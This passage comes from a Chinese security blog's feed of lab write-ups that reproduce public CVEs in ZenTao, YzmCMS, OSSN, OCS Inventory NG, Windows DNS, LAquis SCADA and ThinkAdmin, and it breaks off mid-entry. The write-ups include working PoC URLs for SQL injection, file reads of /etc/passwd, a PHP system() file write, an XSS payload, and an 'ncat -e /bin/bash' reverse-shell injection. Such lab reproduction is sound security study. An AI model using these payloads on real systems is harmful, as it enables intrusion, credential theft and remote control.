        <content type="html"><![CDATA[<p>禅道全版本存在RCE漏洞，普通权限的攻击者可以通过module/api/control.php中的getModel方法，越权调用module目录下所有model模块和方法，从而实现SQL注入、任意文件读取、远程代码执行等攻击。</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>kali，Zentao v11.6</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官网的DEB包我下载后无法正常使用，不知道是下载过程中有损坏还是版本不兼容，于是找到了压缩包。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">$ wget https:<span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>zentao<span class="token punctuation">.</span>net<span class="token operator">/</span>dl<span class="token operator">/</span>zentao<span class="token operator">/</span>11<span class="token punctuation">.</span>6<span class="token operator">/</span>ZenTaoPMS<span class="token punctuation">.</span>11<span class="token punctuation">.</span>6<span class="token punctuation">.</span>stable<span class="token punctuation">.</span>zbox_64<span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz`下载后一定要解压到<span class="token operator">/</span>opt目录下$ tar <span class="token operator">-</span>xzvf ZenTaoPMS<span class="token punctuation">.</span>11<span class="token punctuation">.</span>6<span class="token punctuation">.</span>stable<span class="token punctuation">.</span>zbox_64<span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz <span class="token operator">-</span>C <span class="token operator">/</span>opt可以手动开启apache和mysql，也可以用下面的方法（如果已经开启，那么下面的方式会报错）$ <span class="token operator">/</span>opt<span class="token operator">/</span>zbox<span class="token operator">/</span>zbox <span class="token function">start</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后，浏览器访问<a target="_blank" rel="noopener" href="http://127.0.0.1/zentao/">http://127.0.0.1/zentao/</a>，即可跳转到登录界面。</p><p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1/zentao/index.php?mode=getconfig">http://127.0.0.1/zentos/index.php?mode=getconfig</a>可以查看版本信息。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>登录，初始用户名admin，密码123456，初次登录需要修改密码。</p><p>登录成功后，在url栏输入<a target="_blank" rel="noopener" href="http://127.0.0.1/zentao/api-getModel-api-sql-sql=select+account,password+from+zt_user">http://127.0.0.1/zentao/api-getModel-api-sql-sql=select+account,password+from+zt_user</a>，这是SQL注入的POC，它将构造一条<code>select account,password from zt_user</code>这样的SQL语句。结果如下：</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>POC:</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/zentao/api-getModel-file-parseCSV-fileName=/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>‘fileName=’后面的内容可以自定义，我这里是读取/etc/passwd里面的内容。</p><h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><p>使用HackBar发送POST请求，请求url为<a target="_blank" rel="noopener" href="http://127.0.0.1/zentao/api-getModel-editor-save-filePath=/tmp/1111">http://127.0.0.1/zentao/api-getModel-editor-save-filePath=/tmp/1111</a>，Post Data为<code>fileContent=&lt;?php phpinfo()?&gt;</code>。这将在/tmp下创建一个名字为1111的文件，文件内容为phpinfo()页面。不用在意页面提示的fail，只要查看/tmp目录下已经有文件即可。</p><p>然后若想访问该文件，需要以下POC:</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/zentao/api-getModel-api-getMethod-filePath=/tmp/1111/1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在1111后面必须再加上一层，否则无法正常访问。</p><p>也可以使用其他POC来进行RCE，如<code>fileContent=&lt;?php system('ip a');?&gt;</code>。然后就可以看到本机IP已经在下面显示了出来。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-22394 YzmCMS XSS漏洞复现</title>
      <link href="2020/12/24/cve-2020-22394/"/>
      <url>2020/12/24/cve-2020-22394/</url>
      
        <content type="html"><![CDATA[<p>YzmCMS V5.5存在XSS跨站脚本漏洞，在编辑会员投稿的时候可触发。</p><p>XSS漏洞：恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>kali，php7.4.11，mariadb10.5.8，apache2.4.46</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我这里使用了apache2。首先需要开启伪静态。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ a2enmod rewrite$ <span class="token function">vim</span> /etc/apache2/apache2.conf将/var/www/html字样下面的AllowOverride None替换为AllowOverride all$ systemctl restart apache2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>将YzmCMS文件夹下的内容复制到/var/www/html目录（或者是自定义的apache2目录）下，浏览器访问<a target="_blank" rel="noopener" href="http://localhost/yamcms">http://localhost/yzmcms</a>(这里的yzmcms替换为相应文件夹的名字)，正常情况下会进入安装界面，点击开始安装。</p><p>注意：我之前尝试了好几次安装，但都没有成功，后来查到可能需要将www/目录及其子目录、子文件的权限更改为最高，即<code>chmod 777 -R /var/www/</code>，我尝试了一下发现安装成功了。</p><p>在安装过程的第二步可能会出现一些问题，如果是文件权限问题，则使用chmod命令更改文件目录权限；如果上面curl扩展库哦提示未启动，则输入<code>apt install php-curl</code>安装php的curl扩展库。之后可能会发现无法进入下一步，需要更改上面的url，将step=2改为step=3，只要检测通过，这一步不会做任何实际性操作（至少我没发现做什么了，而且后面安装也不影响）。</p><p>需要先开启数据库，并创建一个名字为yzmcms的数据库。其他信息随意填。填写完成后点击创建数据，就会进行安装。</p><p>安装成功后，根据提示进入后台管理。如果出现以下界面，说明是真的安装成功了。验证码无法加载是因为PHP扩展GD库未开启，输入<code>apt install php-gd</code>可安装，安装后需要重启。默认用户名和密码均为yzmcms。</p><p>登录成功。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在会员管理界面创建一个会员账户。</p><p>访问<code>/member/index/login.html</code>，登录会员账户。</p><p>登录后，点击左侧栏最上面的“在线投稿”，在里面随便填写一点内容，然后提交。提交成功后，选择该稿件点击编辑，然后打开BurpSuite抓取编辑稿件提交的包（注意：不是抓取新建稿件提交的包，两个包并不相同，根据url可以区分）。</p><p>将该包发送到reapter，然后删除最后一行<code>content=</code>后面的内容，改为xss的payload，比如<code>&lt;img+src%3d1+onpointerout%3dalert(1)&gt;</code>，发送。（Proxy中抓到的包已经可以放行了）</p><p>然后再次进入该稿件的编辑界面，会发现在内容栏中输入的字符串不见了，取而代之的是一个损坏图片的图标。当鼠标滑过该图标时，将触发xss。也可以使用其他的payload，产生的效果也会有不同。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/xuandao_ahfengren/article/details/110233227">https://blog.csdn.net/xuandao_ahfengren/article/details/110233227</a></li><li><a target="_blank" rel="noopener" href="https://github.com/yzmcms/yzmcms/issues/42">https://github.com/yzmcms/yzmcms/issues/42</a></li><li><a target="_blank" rel="noopener" href="http://doc.yzmcms.com/anzhuang.html">http://doc.yzmcms.com/anzhuang.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-10560 OSSN任意文件读取漏洞复现</title>
      <link href="2020/12/17/cve-2020-10560/"/>
      <url>2020/12/17/cve-2020-10560/</url>
      
        <content type="html"><![CDATA[<p>CVE-2020-10560 OSSN任意文件读取漏洞，问题出现在Open Source Social Network(OSSN)5.3及之前版本中。攻击者可通过对Site_Key实施暴力破解攻击来为components/OssnComments/ossn_com.php和libraries/ossn.lib.upgrade.php插入特制的URL，然后利用该漏洞，理论上可以读取任意文件内容。</p><p>在测试过程中发现有些文件（如/etc/hostname）并不能读取出原始值。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>kali，docker</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用docker搭建漏洞复现环境。首先下载OSSN环境。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> clone https://github.com/kevthehermit/CVE-2020-10560.git$ docker-compose up --build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>等待一段时间，不再继续往下运行时在新终端中查看是否完成。</p><p>浏览器访问localhost，如下图所示。点击页面最下面的next。</p><p>继续next，然后填写数据库信息和网站信息，数据库信息参照下图，或刚才git clone到的readme.md文件，网站信息随意填。</p><p>填写好后，点击Install，下一步是创建管理员账户，信息随意填。然后环境搭建完成，会自动跳转到登录界面，暂时先不需要登录。下一步是获取site_key的值。由于我们是在本地使用docker搭建的复现环境，因此可以直接查询数据库来获取site_key的值。刚才应该已经看到，同时还有一个mysql的docker镜像在运行。我们进入这个镜像来查询。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker <span class="token builtin class-name">exec</span> -it dockerID <span class="token function">bash</span>mysql -uossn -possnuse ossn<span class="token punctuation">;</span><span class="token keyword">select</span> value from ossn_site_settings where <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"site_key"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>查询到的值为709a609e。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在刚才git clone下来的文件中有poc.py文件，使用python3运行。格式如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python poc.py site_key 要读取的文件 http://IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如图所示，已读取到/etc/passwd和/etc/hosts的内容。</p><p>读取/etc/hostname显示的并不是原始值（可能是经过加密的值）：</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 任意文件读取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-14947 OCS Inventory NG v2.7任意代码执行漏洞复现</title>
      <link href="2020/12/17/cve-2020-14947/"/>
      <url>2020/12/17/cve-2020-14947/</url>
      
        <content type="html"><![CDATA[<p>OCS Inventory NG v2.7允许通过shell元字符执行远程命令，漏洞函数在/require/commandLine/CommandLine/php中。理论上，该漏洞允许任意代码执行。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>靶机：Ubuntu 18.04.5，OCS Inventory NG v2.7</p><p>攻击机：Kali Linux</p><h2 id="靶机环境配置"><a href="#靶机环境配置" class="headerlink" title="靶机环境配置"></a>靶机环境配置</h2><p>首先需要安装一些需要的软件包和模块。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#1.安装Mariadb</span>$ <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> mariadb-server mariadb-client -y$ <span class="token function">sudo</span> systemctl start mariadb$ <span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> mariadb$ <span class="token function">sudo</span> mysql_secure_installation <span class="token comment">#设置好密码后，后面均输入y</span><span class="token comment">#2.安装gcc和make</span>$ <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">make</span> cmake gcc <span class="token function">make</span> -y<span class="token comment">#3.安装apache2 http server</span>$ <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> apache2 libapache2-mod-perl2 libapache-dbi-perl libapache-db-perl libapache2-mod-php<span class="token comment">#4.安装php和php-zip模块</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> software-properties-common$ <span class="token function">sudo</span> add-apt-repository ppa:ondrej/php$ <span class="token function">sudo</span> <span class="token function">apt</span> update$ <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> php7.2 libapache2-mod-php7.2 php7.2-common php7.2-sqlite3 php7.2-mysql php7.2-gmp php7.2-curl php7.2-mbstring php7.2-gd php7.2-cli php7.2-xml php7.2-zip php7.2-soap php7.2-json php-pclzip$ <span class="token function">sudo</span> <span class="token function">vim</span> /etc/php/7.2/apache2/php.ini<span class="token comment"># 修改以下参数</span>file_uploads <span class="token operator">=</span> Onallow_url_fopen <span class="token operator">=</span> Onshort_open_tag <span class="token operator">=</span> Onmemory_limit <span class="token operator">=</span> 256Mupload_max_filesize <span class="token operator">=</span> 100Mmax_execution_time <span class="token operator">=</span> <span class="token number">360</span>date.timezone <span class="token operator">=</span> America/Chicago$ <span class="token function">sudo</span> systemctl restart apache2.service<span class="token comment"># 测试是否成功</span>$ <span class="token function">sudo</span> <span class="token function">vim</span> /var/www/html/phpinfo.php<span class="token comment">#写入以下内容，然后浏览器访问`localhost/phpinfo.php`查看是否成功</span><span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">&gt;</span><span class="token comment">#5.安装Perl及其所需要的模块</span>$ <span class="token function">sudo</span> <span class="token function">apt</span> -y <span class="token function">install</span> perl libxml-simple-perl libcompress-zlib-perl libdbi-perl libdbd-mysql-perl libnet-ip-perl libsoap-lite-perl libio-compress-perl libapache-dbi-perl libapache2-mod-perl2 libapache2-mod-perl2-dev$ <span class="token function">sudo</span> perl -MCPAN -e <span class="token string">'install Apache2::SOAP'</span>$ <span class="token function">sudo</span> perl -MCPAN -e <span class="token string">'install Net::IP'</span>$ <span class="token function">sudo</span> perl -MCPAN -e <span class="token string">'install Apache::DBI'</span>$ <span class="token function">sudo</span> perl -MCPAN -e <span class="token string">'install Mojolicious::Lite'</span>$ <span class="token function">sudo</span> perl -MCPAN -e <span class="token string">'install Switch'</span>$ <span class="token function">sudo</span> perl -MCPAN -e <span class="token string">'install Plack::Handler'</span>$ <span class="token function">sudo</span> perl -MCPAN -e <span class="token string">'install XML::Entities'</span><span class="token comment">#6.创建OCS Inventory数据库</span>$ <span class="token function">sudo</span> mysql -u root -p<span class="token operator">&gt;</span> CREATE DATABASE ocs<span class="token punctuation">;</span><span class="token operator">&gt;</span> CREATE <span class="token environment constant">USER</span> <span class="token string">'ocsuser'</span>@<span class="token string">'localhost'</span> IDENTIFIED BY<span class="token string">'password'</span><span class="token punctuation">;</span><span class="token operator">&gt;</span> GRANT ALL ON ocs.* TO <span class="token string">'ocsuser'</span>@<span class="token string">'localhost'</span> WITH GRANT OPTION<span class="token punctuation">;</span><span class="token operator">&gt;</span> FLUSH PRIVILEGES<span class="token punctuation">;</span><span class="token operator">&gt;</span> EXIT<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载<a target="_blank" rel="noopener" href="https://github.com/OCSInventory-NG/OCSInventory-ocsreports/releases/tag/2.7">OCS Inventory NG v2.7</a>。解压后进入目录下，修改setup.sh中的数据库相关信息。</p><p>修改完成后，输入<code>sudo ./setup.sh</code>开始安装。前面的环境配置没问题的话，一般来说安装过程中的所有选项默认即可。完成后，检查一下需要的Perl模块是否都可用。若有错误，安装相应的模块即可。</p><p>到这里为止，我们依然不能通过网页访问该服务器，还需要配置OCS Iventory服务器。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">ln</span> -s /etc/apache2/conf-available/ocsinventory-reports.conf /etc/apache2/conf-enabled/ocsinventory-reports.conf$ <span class="token function">sudo</span> <span class="token function">ln</span> -s /etc/apache2/conf-available/z-ocsinventory-server.conf /etc/apache2/conf-enabled/z-ocsinventory-server.conf$ <span class="token function">sudo</span> <span class="token function">ln</span> -s /etc/apache2/conf-available/zz-ocsinventory-restapi.conf /etc/apache2/conf-enabled/zz-ocsinventory-restapi.conf$ <span class="token function">sudo</span> <span class="token function">chown</span> -R www-data:www-data /var/lib/ocsinventory-reports$ <span class="token function">sudo</span> systemctl restart apache2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面完成后，就可以通过浏览器访问管理界面了：<a target="_blank" rel="noopener" href="http://localhost/ocsreports/install.php">http://localhost/ocsreports/install.php</a>。打开后如下图所示：</p><p>填写好相关信息后即可登录（关于SSL的部分可留空）。在下一个页面点击OCS-NG GUI，然后点击Perform the update。然后安装就结束了，初始用户名和密码均为admin。</p><p>登录成功后，还有一步十分关键：靶机还需要安装nmap（<code>sudo apt install nmap</code>），目的是为了使用ncat命令。</p><p>环境配置结束。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>打开kali，先使用nc监听某个端口（我选择3333）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvp <span class="token number">3333</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>浏览器访问上面的页面并登录，在上侧栏选择Configuration–&gt;General configuration，然后在左侧栏选择SNMP。之后，在输入框中填入<code>; ncat -e /bin/bash 本机IP 3333 #</code>后点击update。如果成功的话，会提示Update done。</p><p>然后，进入Configuration–&gt;SNMP configuration，在这里打开Burpsuite开始抓包，抓取点击左侧栏Add MIB file的http包。抓到后，将其中任意一个字符串改成update_snmp。</p><p>改好后，点击forward。查看nc的状态，等待几秒钟，成功连接。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 任意代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1350 Windows Server DNS漏洞复现</title>
      <link href="2020/12/08/cve-2020-1350/"/>
      <url>2020/12/08/cve-2020-1350/</url>
      
        <content type="html"><![CDATA[<p>Windows DNS Server远程代码执行漏洞（CVE-2020-1350）：未经身份验证的攻击者可通过向目标DNS服务器发送特制数据包从而目标系统上以本地SYSTEM账户权限执行任意代码。该漏洞无需交互、不需要身份认证且Windows DNS Server默认配置可触发。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>windows server 2008 sp2</li><li>windows server 2008 r2 sp1 x64</li><li>windows server 2012</li><li>windows server 2012 r2</li><li>windows server 2016</li><li>windows server 2019</li></ul><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>受害者：Windows Server 2008 R2 sp1，192.168.227.128</p><p>恶意服务器：kali，192.168.227.180</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-开启DNS服务器"><a href="#1-开启DNS服务器" class="headerlink" title="1. 开启DNS服务器"></a>1. 开启DNS服务器</h3><p>首先需要配置静态IP。</p><p>打开服务器管理器，选择“添加角色”，在下一步中选中dns，然后一直下一步直到安装成功。</p><h3 id="2-运行python脚本"><a href="#2-运行python脚本" class="headerlink" title="2. 运行python脚本"></a>2. 运行python脚本</h3><p>下载<a target="_blank" rel="noopener" href="https://github.com/maxpl0it/CVE-2020-1350-DoS">POC</a>，POC为python2脚本，使用root权限运行：<code>sudo python sigred_dos.py evil_domain_name</code>。</p><h3 id="3-在受害者服务器配置DNS转发器"><a href="#3-在受害者服务器配置DNS转发器" class="headerlink" title="3. 在受害者服务器配置DNS转发器"></a>3. 在受害者服务器配置DNS转发器</h3><p>为了方便后续过程，将本机DNS设置为转发器。具体步骤为：将服务管理器左侧栏角色下的DNS服务器点开，在DNS一栏中找到当前主机名，右键选择属性，点击“转发器”后进行编辑。</p><h3 id="4-受害者查询9-ibrokethe-net"><a href="#4-受害者查询9-ibrokethe-net" class="headerlink" title="4. 受害者查询9.ibrokethe.net"></a>4. 受害者查询9.ibrokethe.net</h3><p>在这里打开wireshark进行抓包。</p><p>在受害者服务器使用nslookup命令查询9.evil_domain_name：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nslookup</span> -type<span class="token operator">=</span>sig <span class="token number">9</span>.ibrokethe.net <span class="token number">127.0</span>.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看kali，发现收到了一个UDP连接，又收到了一个TCP连接。</p><p>抓包结果如下：</p><p>由于本地无法解析“ibrokethe.net”，因此会以UDP协议向恶意服务器kali发送DNS查询，也就是kali收到的第一个UDP连接。恶意服务器查到了该域名，就向受害者发送响应包，设置TC位，通知受害者采用TCP重发原来的查询请求，并允许返回的响应报文超过512个字节。这是第二个DNS包。然后进行三次握手，受害者再次以TCP协议发送请求，这就是kali收到的TCP连接。之后，恶意服务器就可以利用TCP传输大于64KB的响应包发给受害者，触发漏洞，造成堆溢出。</p><p>然后，就可以进行远程代码执行等操作了。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-6020 LAquis SCADA目录遍历漏洞复现</title>
      <link href="2020/12/07/cve-2017-6020/"/>
      <url>2020/12/07/cve-2017-6020/</url>
      
        <content type="html"><![CDATA[<p>该漏洞为LAquis SCADA的目录遍历漏洞，它允许攻击者下载受害者主机上的任意文件。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>LAquis_SCADA 4.1.0.3237及之前版本</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>靶机：Windows7 64位 SP1，LAquis 4.1.0.2385，192.168.227.131</p><p>攻击机：Kali Linux，192.168.227.128</p><h2 id="靶机环境配置"><a href="#靶机环境配置" class="headerlink" title="靶机环境配置"></a>靶机环境配置</h2><h3 id="1-安装LAquis"><a href="#1-安装LAquis" class="headerlink" title="1. 安装LAquis"></a>1. 安装LAquis</h3><p>所有选项均默认即可。</p><h3 id="2-开启漏洞服务"><a href="#2-开启漏洞服务" class="headerlink" title="2. 开启漏洞服务"></a>2. 开启漏洞服务</h3><p>打开LAquis，不创建任何工程，点击左上角的Menu，选择open，然后打开软件自带的样例，在<code>Your LAquis Path/Apls/Examples/ExemplosCLPs/MODBUS</code>文件夹下，如下图。</p><p>打开后，点击Menu，在File一栏中选中WEB Server，启动webserver。</p><p>点击Activate WEB server，在弹出框选择“是”。</p><p>之后会自动弹出该页面。</p><p>远程访问<code>http://靶机IP:1234</code>，如果出现以下界面，则漏洞服务部署成功。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>将<a target="_blank" rel="noopener" href="http://www.exploit-db.com/exploits/42885">脚本</a>复制到/usr/share/metasploit-framework/modules/auxiliary/server/目录下，并重命名为laquis_directory_traversal.rb。非root可能没有权限。</p><p>然后打开msfconsole，使用此脚本进行漏洞利用（如果进入后提示无法加载该脚本，请检查一下脚本名字是否符合规范）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">reload_alluse exploit/windows/scada/LAquis_SCADA_cve_2017_6020show options<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我在<code>reload_all</code>时遇到了报错：</p><p>我推断是某个rb文件下的内容出错了，于是搜索“Kong”找到了Kong_gate_admin_api_rce.rb文件，将它移到了其他地方备份。然后再次打开msf，<code>reload_all</code>成功。</p><p>然后<code>show options</code>查看需要设置的参数，其中参数DEPTH和FILE的含义如下：</p><ul><li>DEPTH: 到达基本目录的级别（也就是有多少个../），如果安装时未更改路径，默认就是向上跳转10级</li><li>FILE: 要下载的文件，和上面额度DEPTH参数结合组成完整的文件路径</li></ul><p>我这里DEPTH默认，FILE设置为Users/Public/Documents/cve6020.txt（需要提前在对应目录下创建该文件）。</p><p>参数设置完成后，输入<code>run</code>开始攻击，结果如下：</p><p>前往/root/.msf4/loot/目录下查看该文件：</p><p>说明文件已经下载成功。之后就可以尝试着下载一些有价值的文件了。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路径遍历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-25540 ThinkAdmin漏洞复现</title>
      <link href="2020/11/19/cve-2020-25540/"/>
      <url>2020/11/19/cve-2020-25540/</url>
      
        <content type="html"><![CDATA[<p>ThinkAdmin V6版本存在路径遍历漏洞。该漏洞主要是因为api中存在危险函数，且未作任何限制。未作任何认证可以直接调用api中此两危险函数。攻击者可利用该漏洞通过请求编码参数任意读取远程服务器上的文件。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>ThinkAdmin版本小于 ≤ 2020.08.03.01</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>Windows10 1511 64位 家庭版，phpStudy2018，ThinkAdmin V6</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h3><p>安装<a target="_blank" rel="noopener" href="https://www.xp.cn/download.html">phpStudy2018</a>，注意安装目录不能含有空格。安装完成后，切换版本为php7.1或以上，并添加环境变量。在命令行输入<code>php -v</code>验证是否配置成功。</p><p>还是在php-7.2.1-nts目录下，找到<code>php.ini</code>文件并打开，找到<code>extension=php_openssl.dll</code>，去掉前面的分号。这一步的目的是能在cmd命令中进行访问。</p><p>然后下载<a target="_blank" rel="noopener" href="https://getcomposer.org/download/">composer</a>最新版（Manual Download下面找），下载完成后是一个.phar文件，把该文件放在php目录下，然后在同目录下创建一个composer.bat文件，写入以下内容后执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@ECHO OFF php <span class="token string">"%~dp0composer.phar"</span> %*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>重启电脑，命令行输入<code>composer -v</code>验证是否安装成功。</p><p>安装成功后可以选择性的设置阿里源：<code>composer config -g repo.packagist composer https://mirrors.aliyun.com/composer</code>。</p><p>设置好composer后下载<a target="_blank" rel="noopener" href="https://gitee.com/alleynstranger/think-admin-v6">ThinkAdmin V6</a>，这个是Gitee的链接，如果选择下载zip可能会出错，可以直接使用<code>git clone https://gitee.com/alleynstranger/think-admin-v6.git</code>。下载完成后进入ThinkAdmin目录，命令行打开输入<code>composer install</code>，等待一会儿安装成功。在这里可能会报错，不用在意，继续往后进行，只要输入<code>php think run</code>后正常执行即可。</p><p>然后需要创建一个数据库。启动phpStudy，在MySQL管理器中打开MySQL-Front，右键左侧栏的localhost选择新建数据库，名字我这里取的是admin_v6。创建完成保留为空数据库即可，然后右键该数据库，选择输入–&gt;SQL文件，然后选择thinkadmin目录下附带的sql文件进行导入。</p><p>打开ThinkAdmin/config/database.php文件，修改数据库信息。用户名和密码默认均为root，端口默认为3306。</p><p>以上都没有问题，则命令行输入<code>php think run</code>运行thinkadmin，没有报错，浏览器打开<a target="_blank" rel="noopener" href="http://127.0.0.1:8000/">http://127.0.0.1:8000</a>。如果提示控制器不存在，则修改config/app.php文件中的<code>'default_app'      =&gt; 'admin'</code>。</p><h3 id="2-目录遍历"><a href="#2-目录遍历" class="headerlink" title="2. 目录遍历"></a>2. 目录遍历</h3><p>使用BurpSuite抓取上面那个页面的包，发送到Reapter，修改几处：</p><ul><li>GET改为POST</li><li>网址改为<code>/admin.html?s=admin/api.Update/node</code></li><li>在最后加上一行<code>rules=%5b%22%2f%22%5d</code></li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html">POST /admin.html?s=admin/api.Update/node HTTP/1.1Host: 192.168.227.146:8000Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=807d87164805eb1b01f6d21b67721985Connection: closeContent-Length: 21rules=%5b%22%2f%22%5d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送后，就可以看到返回包里带有目录列表了。</p><h3 id="3-任意文件读取"><a href="#3-任意文件读取" class="headerlink" title="3. 任意文件读取"></a>3. 任意文件读取</h3><p>在ThinkAdmin根目录下新建一个<code>1.txt</code>文件，写入任意字符串（例如：php），然后建一个php文件，写入以下内容：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token 